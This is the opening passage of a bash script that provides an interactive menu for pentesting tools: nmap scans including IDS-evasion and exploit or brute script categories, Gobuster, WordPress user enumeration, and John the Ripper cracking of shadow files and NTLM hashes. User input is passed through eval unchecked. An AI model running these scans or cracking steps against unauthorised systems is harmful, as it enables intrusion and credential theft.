#!/bin/bash
# Psatool-420 - Interactive Pentesting Automation Script

# Function to display the banner with figlet
show_banner() {
    clear
    figlet -f  slant  "Psatool-420" | lolcat
    echo -e "\n\033[1;34mVer : 1.0.2\033[0m"
    echo -e "\n\033[1;34mInteractive Pentesting Automation\033[0m"
    
    # Show VPN Status
    check_vpn_status
    
    echo -e "\033[1;33m=====================================\033[0m"
}

# Modified function to display the main menu with VPN option
show_menu() {
    echo -e "\033[1;32m[*] Choose an option:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mRun Nmap Scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mRun Gobuster Scan\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mRun WPScan\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mRun John the Ripper\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mNetcat Payload Generator\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mRun SQLMap\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mRun Nikto\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;32mOSINT Tools\033[0m"
    echo -e "\033[1;36m9)\033[0m \033[1;32mRun Bettercap\033[0m"
    echo -e "\033[1;36m10)\033[0m \033[1;32mOpenVPN Manager\033[0m"
    echo -e "\033[1;36m69)\033[0m \033[1;31mExit\033[0m"
    echo -e "\033[1;33m=====================================\033[0m"
    echo -n "Please choose an option: "
}


# Function to run Nmap scan with enhanced options
run_nmap() {
    # Show a stylish header
    clear 
    figlet -f slant "Nmap Scanner" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m        Network Mapping Utility Suite      \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    # Main menu for Nmap operations
    echo -e "\033[1;34mMAIN MENU:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mRun Nmap Scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mView Previous Scan Results\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mSchedule Automated Scan\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mNetwork Range Scanner\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mHelp & Documentation\033[0m"
    echo -e "\033[1;36m0)\033[0m \033[1;32mReturn to Main Menu\033[0m"
    
    echo -n -e "\033[1;34mEnter your choice: \033[0m"
    read main_choice
    
    case $main_choice in
        1)
            perform_nmap_scan
            ;;
        2)
            view_previous_results
            ;;
        3)
            schedule_scan
            ;;
        4)
            network_range_scanner
            ;;
        5)
            show_help_documentation
            ;;
        0)
            echo -e "\033[1;33mReturning to main menu...\033[0m"
            return
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Please select a valid option.\033[0m"
            sleep 2
            run_nmap
            ;;
    esac
}

perform_nmap_scan() {
    clear
    figlet -f slant "Nmap Scan" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m             Scan Configuration            \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    # Target selection
    echo -e "\033[1;34mTARGET SELECTION:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mSingle IP or Domain\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mIP Range (e.g., 192.168.1.1-20)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mSubnet (e.g., 192.168.1.0/24)\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mLoad targets from file\033[0m"
    echo -e "\033[1;36m0)\033[0m \033[1;32mBack to Main Menu\033[0m"
    
    echo -n -e "\033[1;34mEnter your choice: \033[0m"
    read target_choice
    
    case $target_choice in
        0)
            run_nmap
            return
            ;;
        1)
            echo -e "\n\033[1;34mEnter target IP or domain:\033[0m "
            read target
            ;;
        2)
            echo -e "\n\033[1;34mEnter IP range (e.g., 192.168.1.1-20):\033[0m "
            read target
            ;;
        3)
            echo -e "\n\033[1;34mEnter subnet (e.g., 192.168.1.0/24):\033[0m "
            read target
            ;;
        4)
            echo -e "\n\033[1;34mEnter path to targets file:\033[0m "
            read targets_file
            if [[ ! -f "$targets_file" ]]; then
                echo -e "\033[1;31mFile not found! Returning to Target Selection.\033[0m"
                sleep 2
                perform_nmap_scan
                return
            fi
            target="-iL $targets_file"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to Target Selection.\033[0m"
            sleep 2
            perform_nmap_scan
            return
            ;;
    esac
    
    if [[ -z "$target" && $target_choice != 4 ]]; then
        echo -e "\033[1;31mYou must provide a target! Returning to Target Selection.\033[0m"
        sleep 2
        perform_nmap_scan
        return
    fi
    
    # Scan Type Selection
    clear
    figlet -f slant "Scan Type" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m             Select Scan Type              \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    echo -e "\033[1;34mBASIC SCANS:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mPing Scan (Host Discovery)\033[0m - Discovers which hosts are online"
    echo -e "\033[1;36m2)\033[0m \033[1;32mQuick Scan\033[0m - Fast scan of most common 100 ports"
    echo -e "\033[1;36m3)\033[0m \033[1;32mRegular Scan\033[0m - Standard 1000 port scan"
    echo -e "\033[1;36m4)\033[0m \033[1;32mIntensive Scan\033[0m - Detailed scan with version detection"
    
    echo -e "\n\033[1;34mADVANCED SCANS:\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mFull Port Scan\033[0m - Scan all 65535 ports (slow)"
    echo -e "\033[1;36m6)\033[0m \033[1;32mStealth SYN Scan\033[0m - Less intrusive TCP SYN scan"
    echo -e "\033[1;36m7)\033[0m \033[1;32mUDP Scan\033[0m - Scan for UDP services"
    echo -e "\033[1;36m8)\033[0m \033[1;32mOS Detection\033[0m - Attempt to identify operating system"
    
    echo -e "\n\033[1;34mSPECIALIZED SCANS:\033[0m"
    echo -e "\033[1;36m9)\033[0m \033[1;32mVulnerability Scan\033[0m - Check for known vulnerabilities"
    echo -e "\033[1;36m10)\033[0m \033[1;32mService & Version Detection\033[0m - Identify services and versions"
    echo -e "\033[1;36m11)\033[0m \033[1;32mFirewall/IDS Evasion Scan\033[0m - Attempt to bypass security measures"
    echo -e "\033[1;36m12)\033[0m \033[1;32mComprehensive Scan\033[0m - Full-featured intensive scan (slow)"
    
    echo -e "\n\033[1;34mCUSTOM OPTIONS:\033[0m"
    echo -e "\033[1;36m13)\033[0m \033[1;32mCustom Scan\033[0m - Build your own scan with specific Nmap options"
    echo -e "\033[1;36m0)\033[0m \033[1;32mBack to Target Selection\033[0m"
    
    echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
    read scan_choice
    
    case $scan_choice in
        0)
            perform_nmap_scan
            return
            ;;
        1)
            scan_type="Host Discovery"
            scan_cmd="nmap -sn"
            ;;
        2)
            scan_type="Quick Scan"
            scan_cmd="nmap -T4 -F"
            ;;
        3)
            scan_type="Regular Scan"
            scan_cmd="nmap"
            ;;
        4)
            scan_type="Intensive Scan"
            scan_cmd="nmap -T4 -A"
            ;;
        5)
            scan_type="Full Port Scan"
            scan_cmd="nmap -p-"
            ;;
        6)
            scan_type="Stealth SYN Scan"
            scan_cmd="nmap -sS -T2"
            ;;
        7)
            scan_type="UDP Scan"
            scan_cmd="nmap -sU --top-ports 100"
            ;;
        8)
            scan_type="OS Detection"
            scan_cmd="nmap -O --osscan-guess"
            ;;
        9)
            scan_type="Vulnerability Scan"
            scan_cmd="nmap -sV --script vuln"
            ;;
        10)
            scan_type="Service & Version Detection"
            scan_cmd="nmap -sV -sC"
            ;;
        11)
            scan_type="Firewall/IDS Evasion Scan"
            scan_cmd="nmap -f -t 0 -n -Pn --data-length 200"
            ;;
        12)
            scan_type="Comprehensive Scan"
            scan_cmd="nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)'"
            ;;
        13)
            echo -e "\n\033[1;34mEnter custom Nmap options:\033[0m "
            read custom_options
            scan_type="Custom Scan"
            scan_cmd="nmap $custom_options"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to Scan Type Selection.\033[0m"
            sleep 2
            # Re-call the function to show the menu again
            perform_nmap_scan
            return
            ;;
    esac
    
    # Advanced Options Menu
    clear
    figlet -f slant "Options" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m             Advanced Options              \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    echo -e "\033[1;34mWould you like to add any advanced options?\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mNo, continue with current settings\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mSpecify timing template (0-5, slower to faster)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mSpecify verbosity level\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mSpecify output format(s)\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mAdd script categories\033[0m"
    echo -e "\033[1;36m0)\033[0m \033[1;32mBack to Scan Type Selection\033[0m"
    
    echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
    read advanced_choice
    
    case $advanced_choice in
        0)
            # Go back to scan type selection
            perform_nmap_scan
            return
            ;;
        1)
            # Continue with current settings
            ;;
        2)
            echo -e "\n\033[1;34mEnter timing template (0-5, slower to faster):\033[0m "
            read timing
            if [[ $timing =~ ^[0-5]$ ]]; then
                scan_cmd="$scan_cmd -T$timing"
            else
                echo -e "\033[1;31mInvalid timing value! Using default.\033[0m"
                sleep 2
            fi
            ;;
        3)
            echo -e "\n\033[1;34mEnter verbosity level (0-2):\033[0m "
            read verbosity
            if [[ $verbosity == "1" ]]; then
                scan_cmd="$scan_cmd -v"
            elif [[ $verbosity == "2" ]]; then
                scan_cmd="$scan_cmd -vv"
            fi
            ;;
        4)
            echo -e "\n\033[1;34mSelect output format(s):\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mNormal (-oN)\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mXML (-oX)\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mGreppable (-oG)\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mAll formats (-oA)\033[0m"
            echo -n -e "\033[1;34mEnter your choice: \033[0m"
            read format_choice
            
            echo -e "\n\033[1;34mEnter output file name (without extension):\033[0m "
            read output_file
            
            if [[ -z "$output_file" ]]; then
                output_file="nmap_scan_$(date +%Y%m%d_%H%M%S)"
            fi
            
            # Create results directory if it doesn't exist
            mkdir -p results
            
            case $format_choice in
                1)
                    scan_cmd="$scan_cmd -oN results/$output_file.txt"
                    output_files="results/$output_file.txt"
                    ;;
                2)
                    scan_cmd="$scan_cmd -oX results/$output_file.xml"
                    output_files="results/$output_file.xml"
                    ;;
                3)
                    scan_cmd="$scan_cmd -oG results/$output_file.gnmap"
                    output_files="results/$output_file.gnmap"
                    ;;
                4)
                    scan_cmd="$scan_cmd -oA results/$output_file"
                    output_files="results/$output_file.*"
                    ;;
                *)
                    echo -e "\033[1;31mInvalid choice! Using normal output format.\033[0m"
                    scan_cmd="$scan_cmd -oN results/$output_file.txt"
                    output_files="results/$output_file.txt"
                    sleep 2
                    ;;
            esac
            ;;
        5)
            echo -e "\n\033[1;34mSelect script category to add:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mDefault\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mSafe\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mDiscovery\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mVulnerability\033[0m"
            echo -e "\033[1;36m5)\033[0m \033[1;32mExploit\033[0m"
            echo -e "\033[1;36m6)\033[0m \033[1;32mAuth\033[0m"
            echo -e "\033[1;36m7)\033[0m \033[1;32mBrute\033[0m"
            echo -e "\033[1;36m8)\033[0m \033[1;32mCustom script selection\033[0m"
            
            echo -n -e "\033[1;34mEnter your choice: \033[0m"
            read script_choice
            
            case $script_choice in
                1)
                    scan_cmd="$scan_cmd --script default"
                    ;;
                2)
                    scan_cmd="$scan_cmd --script safe"
                    ;;
                3)
                    scan_cmd="$scan_cmd --script discovery"
                    ;;
                4)
                    scan_cmd="$scan_cmd --script vuln"
                    ;;
                5)
                    scan_cmd="$scan_cmd --script exploit"
                    ;;
                6)
                    scan_cmd="$scan_cmd --script auth"
                    ;;
                7)
                    scan_cmd="$scan_cmd --script brute"
                    ;;
                8)
                    echo -e "\n\033[1;34mEnter custom script selection (e.g., 'http-*,ssl-*):\033[0m "
                    read custom_scripts
                    scan_cmd="$scan_cmd --script '$custom_scripts'"
                    ;;
                *)
                    echo -e "\033[1;31mInvalid choice! No scripts added.\033[0m"
                    sleep 2
                    ;;
            esac
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! No advanced options added.\033[0m"
            sleep 2
            ;;
    esac
    
    # Output options if not already specified
    if [[ ! $scan_cmd =~ "-o" ]]; then
        clear
        figlet -f slant "Output" | lolcat
        echo -e "\n\033[1;34m=========================================\033[0m"
        echo -e "\033[1;33m              Output Options               \033[0m"
        echo -e "\033[1;34m=========================================\033[0m\n"
        
        echo -e "\033[1;34mHow would you like to handle the scan results?\033[0m"
        echo -e "\033[1;36m1)\033[0m \033[1;32mView results in terminal only\033[0m"
        echo -e "\033[1;36m2)\033[0m \033[1;32mSave results to file\033[0m"
        echo -e "\033[1;36m3)\033[0m \033[1;32mBoth view and save results\033[0m"
        echo -e "\033[1;36m0)\033[0m \033[1;32mBack to Advanced Options\033[0m"
        
        echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
        read output_choice
        
        case $output_choice in
            0)
                # Go back to advanced options
                perform_nmap_scan
                return
                ;;
            1)
                # View only, do nothing
                ;;
            2|3)
                echo -e "\n\033[1;34mEnter output file name (without extension):\033[0m "
                read output_file
                
                if [[ -z "$output_file" ]]; then
                    output_file="nmap_scan_$(date +%Y%m%d_%H%M%S)"
                fi
                
                # Create results directory if it doesn't exist
                mkdir -p results
                
                scan_cmd="$scan_cmd -oN results/$output_file.txt"
                output_files="results/$output_file.txt"
                ;;
            *)
                echo -e "\033[1;31mInvalid choice! Using view only.\033[0m"
                sleep 2
                ;;
        esac
    fi
    
    # Execute the scan
    clear
    figlet -f slant "Scanning" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m               Scan Details                \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    echo -e "\033[1;34mScan Type:\033[0m \033[1;32m$scan_type\033[0m"
    echo -e "\033[1;34mTarget:\033[0m \033[1;32m$target\033[0m"
    echo -e "\033[1;34mCommand:\033[0m \033[1;32m$scan_cmd $target\033[0m"
    
    if [[ -n "$output_files" ]]; then
        echo -e "\033[1;34mOutput File(s):\033[0m \033[1;32m$output_files\033[0m"
    fi
    
    echo -e "\n\033[1;33m[*] Starting Nmap scan at $(date)...\033[0m"
    echo -e "\033[1;33m[*] This may take some time depending on the scan type and target...\033[0m\n"
    
    # Execute the scan
    if [[ $output_choice == "3" ]]; then
        # Both view and save
        eval "$scan_cmd $target | tee >(cat)"
    else
        # Either view only or save only
        eval "$scan_cmd $target"
    fi
    
    scan_status=$?
    
    if [[ $scan_status -eq 0 ]]; then
        echo -e "\n\033[1;32m[✓] Scan completed successfully at $(date).\033[0m"
        
        if [[ -n "$output_files" ]]; then
            echo -e "\033[1;32m[✓] Results saved to $output_files\033[0m"
        fi
    else
        echo -e "\n\033[1;31m[✗] Scan failed with error code $scan_status.\033[0m"
    fi
    
    echo -e "\n\033[1;33mPress Enter to return to main menu...\033[0m"
    read
    run_nmap
}

view_previous_results() {
    clear
    figlet -f slant "Results" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m            Previous Scan Results          \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    # Check if results directory exists
    if [[ ! -d "results" ]]; then
        echo -e "\033[1;31mNo results directory found. No previous scans available.\033[0m"
        echo -e "\n\033[1;33mPress Enter to return to main menu...\033[0m"
        read
        run_nmap
        return
    fi
    
    # Count files in results directory
    file_count=$(find results -type f | wc -l)
    
    if [[ $file_count -eq 0 ]]; then
        echo -e "\033[1;31mNo scan results found in the results directory.\033[0m"
        echo -e "\n\033[1;33mPress Enter to return to main menu...\033[0m"
        read
        run_nmap
        return
    fi
    
    # List available result files
    echo -e "\033[1;34mAvailable scan results:\033[0m\n"
    
    # Create a numbered list of files
    find results -type f | sort -r | nl -w2 -s') '
    
    echo -e "\n\033[1;34mOptions:\033[0m"
    echo -e "\033[1;36m1-$file_count)\033[0m \033[1;32mView a specific file\033[0m"
    echo -e "\033[1;36mD)\033[0m \033[1;32mDelete a result file\033[0m"
    echo -e "\033[1;36mC)\033[0m \033[1;32mCompare two result files\033[0m"
    echo -e "\033[1;36m0)\033[0m \033[1;32mReturn to main menu\033[0m"
    
    echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
    read file_choice
    
    if [[ $file_choice == "0" ]]; then
        run_nmap
        return
    elif [[ $file_choice =~ ^[0-9]+$ && $file_choice -le $file_count ]]; then
        # View the selected file
        selected_file=$(find results -type f | sort -r | sed -n "${file_choice}p")
        
        clear
        echo -e "\033[1;34m=========================================\033[0m"
        echo -e "\033[1;33m              File Contents              \033[0m"
        echo -e "\033[1;34m=========================================\033[0m\n"
        
        echo -e "\033[1;34mFile:\033[0m \033[1;32m$selected_file\033[0m\n"
        
        # Determine file type and use appropriate viewer
        if [[ $selected_file == *.xml ]]; then
            # For XML files, try to use xmllint if available
            if command -v xmllint &> /dev/null; then
                xmllint --format "$selected_file" | less
            else
                cat "$selected_file" | less
            fi
        else
            # For text files, use less
            less "$selected_file"
        fi
        
        view_previous_results
    elif [[ $file_choice == "D" || $file_choice == "d" ]]; then
        # Delete a file
        echo -e "\n\033[1;34mEnter the number of the file to delete:\033[0m "
        read delete_num
        
        if [[ $delete_num =~ ^[0-9]+$ && $delete_num -le $file_count ]]; then
            file_to_delete=$(find results -type f | sort -r | sed -n "${delete_num}p")
            
            echo -e "\n\033[1;31mAre you sure you want to delete $file_to_delete? (y/n):\033[0m "
            read confirm
            
            if [[ $confirm == "y" || $confirm == "Y" ]]; then
                rm "$file_to_delete"
                echo -e "\033[1;32mFile deleted successfully.\033[0m"
                sleep 2
            fi
        else
            echo -e "\033[1;31mInvalid file number.\033[0m"
            sleep 2
        fi
        
        view_previous_results
    elif [[ $file_choice == "C" || $file_choice == "c" ]]; then
        # Compare two files
        echo -e "\n\033[1;34mEnter the number of the first file:\033[0m "
        read file1_num
        
        echo -e "\033[1;34mEnter the number of the second file:\033[0m "
        read file2_num
        
        if [[ $file1_num =~ ^[0-9]+$ && $file1_num -le $file_count && $file2_num =~ ^[0-9]+$ && $file2_num -le $file_count ]]; then
            file1=$(find results -type f | sort -r | sed -n "${file1_num}p")
            file2=$(find results -type f | sort -r | sed -n "${file2_num}p")
            
            clear
            echo -e "\033[1;34m=========================================\033[0m"
            echo -e "\033[1;33m            Comparing Files              \033[0m"
            echo -e "\033[1;34m=========================================\033[0m\n"
            
            echo -e "\033[1;34mComparing:\033[0m"
            echo -e "\033[1;32m1: $file1\033[0m"
            echo -e "\033[1;32m2: $file2\033[0m\n"
            
            # Use diff to compare files
            diff --color=always -u "$file1" "$file2" | less -R
        else
            echo -e "\033[1;31mInvalid file number(s).\033[0m"
            sleep 2
        fi
        
        view_previous_results
    else
        echo -e "\033[1;31mInvalid choice.\033[0m"
        sleep 2
        view_previous_results
    fi
}

schedule_scan() {
    clear
    figlet -f slant "Schedule" | lolcat
    echo -e "\n\033[1;34m=========================================\033[0m"
    echo -e "\033[1;33m             Schedule Scan                \033[0m"
    echo -e "\033[1;34m=========================================\033[0m\n"
    
    echo -e "\033[1;34mSchedule a scan to run automatically:\033[0m\n"
    
    echo -e "\033[1;34mEnter target IP or domain:\033[0m "
    read schedule_target
    
    echo -e "\n\033[1;34mSelect scan type:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mQuick Scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mFull Scan\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mVulnerability Scan\033[0m"
    
    echo -n -e "\033[1;34mEnter your choice: \033[0m"
    read schedule_scan_type
    
    case $schedule_scan_type in
        1)
            scheduled_scan_cmd="nmap -T4 -F $schedule_target -oN results/scheduled_quick_\$(date +%Y%m%d_%H%M%S).txt"
            ;;
        2)
            scheduled_scan_cmd="nmap -p- -A $schedule_target -oN results/scheduled_full_\$(date +%Y%m%d_%H%M%S).txt"
            ;;
        3)
            scheduled_scan_cmd="nmap -sV --script vuln $schedule_target -oN results/scheduled_vuln_\$(date +%Y%m%d_%H%M%S).txt"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Using Quick Scan.\033[0m"
            scheduled_scan_cmd="nmap -T4 -F $schedule_target -oN results/scheduled_quick_\$(date +%Y%m%d_%H%M%S).txt"
            ;;
    esac
    
    echo -e "\n\033[1;34mEnter when to run the scan (format: HH:MM):\033[0m "
    read schedule_time
    
    echo -e "\n\033[1;34mScheduling scan for $schedule_time...\033[0m"
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    # Schedule the scan with at command
    echo "$scheduled_scan_cmd" | at $schedule_time
    
    echo -e "\n\033[1;32mScan scheduled successfully!\033[0m"
    echo -e "\033[1;33mResults will be saved in the results directory.\033[0m"
    
    echo -e "\n\033[1;34mPress any key to continue...\033[0m"
    read -n 1
}
# Function to run Gobuster scan
run_gobuster() {
    # Ask for target URL
    clear
    figlet -f  slant  "Gobuster" | lolcat
    echo -e "\n\033[1;34mEnter target URL (e.g., http://example.com):\033[0m "
    read target

    if [[ -z "$target" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi

    # Ask the user to select a wordlist (lite, medium, large, extra)
    echo -e "\033[1;34mChoose a wordlist to use (lite, medium, large, extra) or press Enter to use the default:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mLite\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mMedium\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mLarge\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mExtra\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mCustom (enter path)\033[0m"
    echo -n "Enter your choice (default is 'medium'): "
    read wordlist_choice

    # Set default wordlist if none chosen
    case $wordlist_choice in
        1)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt"
            ;;
        2)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
            ;;
        3)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt"
            ;;
        4)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-large.txt"
            ;;
        5)
            echo -e "\033[1;34mEnter the full path to your custom wordlist:\033[0m"
            read custom_wordlist
            if [[ -f "$custom_wordlist" ]]; then
                wordlist="$custom_wordlist"
            else
                echo -e "\033[1;31mFile not found. Using default wordlist.\033[0m"
                wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
            fi
            ;;
        *)
            wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
            echo -e "\033[1;33mUsing default wordlist: 'directory-list-lowercase-2.3-medium.txt'\033[0m"
            ;;
    esac

    # Ask the user for the number of threads (default is 100)
    echo -e "\033[1;34mEnter the number of threads to use (default is 100):\033[0m"
    read threads
    if [[ -z "$threads" ]]; then
        threads=100
        echo -e "\033[1;33mUsing default threads: 100\033[0m"
    fi

    # Ask the user for file extensions to search for (default is php,html,js,css,txt)
    echo -e "\033[1;34mEnter file extensions to search for (default is php,html,js,css,txt):\033[0m"
    read extensions
    if [[ -z "$extensions" ]]; then
        extensions="php,html,js,css,txt"
        echo -e "\033[1;33mUsing default extensions: php,html,js,css,txt\033[0m"
    fi

    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view

    # Create results directory if it doesn't exist
    mkdir -p results

    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="gobuster_scan_$(date +%Y%m%d_%H%M%S)"
        fi

        # Run Gobuster and save to file
        echo -e "\033[1;33m[*] Running Gobuster scan and saving results...\033[0m"
        gobuster dir -u $target -w $wordlist -t $threads -x $extensions -o results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        # Run Gobuster and show results directly on terminal
        echo -e "\033[1;33m[*] Running Gobuster scan and displaying results...\033[0m"
        gobuster dir -u $target -w $wordlist -t $threads -x $extensions
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    else
        echo -e "\033[1;31mInvalid choice. Returning to the main menu.\033[0m"
    fi
}

# Function to run WPScan
run_wpscan() {
    clear
    figlet -f  slant  "WPScan" | lolcat
    echo -e "\n\033[1;34mEnter target URL (WordPress site):\033[0m "
    read target

    if [[ -z "$target" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi

    # Enhanced WPScan options
    echo -e "\033[1;34mSelect WPScan options:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mEnumerate users\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mEnumerate plugins\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mEnumerate themes\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mVulnerability detection\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mComprehensive scan\033[0m"
    echo -n "Enter your choice: "
    read wp_choice

    # Determine WPScan command based on user choice
    case $wp_choice in
        1)
            wp_cmd="wpscan --url $target --random-user-agent"
            ;;
        2)
            wp_cmd="wpscan --url $target --enumerate u --random-user-agent"
            ;;
        3)
            wp_cmd="wpscan --url $target --enumerate p --random-user-agent"
            ;;
        4)
            wp_cmd="wpscan --url $target --enumerate t --random-user-agent"
            ;;
        5)
            wp_cmd="wpscan --url $target --random-user-agent --api-token YOUR_API_TOKEN"
            echo -e "\033[1;33mNote: For full vulnerability detection, add your WPVulnDB API token in the script.\033[0m"
            ;;
        6)
            wp_cmd="wpscan --url $target --enumerate u,p,t,tt,cb,dbe --random-user-agent"
            ;;
        *)
            wp_cmd="wpscan --url $target --enumerate u --random-user-agent"
            echo -e "\033[1;33mUsing default scan options\033[0m"
            ;;
    esac

    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view

    # Create results directory if it doesn't exist
    mkdir -p results

    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="wpscan_$(date +%Y%m%d_%H%M%S)"
        fi

        # Run WPScan and save to file
        echo -e "\033[1;33m[*] Running WPScan and saving results...\033[0m"
        $wp_cmd -o results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        # Run WPScan and show results directly on terminal
        echo -e "\033[1;33m[*] Running WPScan and displaying results...\033[0m"
        $wp_cmd
        echo -e "\033[1;33mPress Enter to continue...\033[0m"
read
    else
        echo -e "\033[1;31mInvalid choice. Returning to the main menu.\033[0m"
    fi
}

# Function to run John the Ripper
run_john() {
    clear
    figlet -f  slant  "John" | lolcat
    echo -e "\n\033[1;34m=================================================\033[0m"
    echo -e "\033[1;34mSelect operation:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mCrack Linux shadow file\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mCrack Windows hash (NTLM)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mCrack MD5 hash(es)\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mCrack SHA hash(es)\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mCrack zip file password\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mCrack RAR file password\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mInput and crack hash directly\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;32mShow cracked passwords\033[0m"
    echo -n "Enter your choice: "
    read john_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    case $john_choice in
        1)
            echo -e "\033[1;34mEnter the path to the shadow file:\033[0m"
            read shadow_path
            if [[ ! -f "$shadow_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            echo -e "\033[1;34mEnter the path to the passwd file (press Enter to skip):\033[0m"
            read passwd_path
            
            # Ask if user wants to save results or view directly
            echo -e "\033[1;34mWould you like to (S)ave intermediary files or use (T)emporary files? (S/T):\033[0m"
            read save_choice
            
            if [[ -z "$passwd_path" ]]; then
                echo -e "\033[1;33m[*] Running John on shadow file...\033[0m"
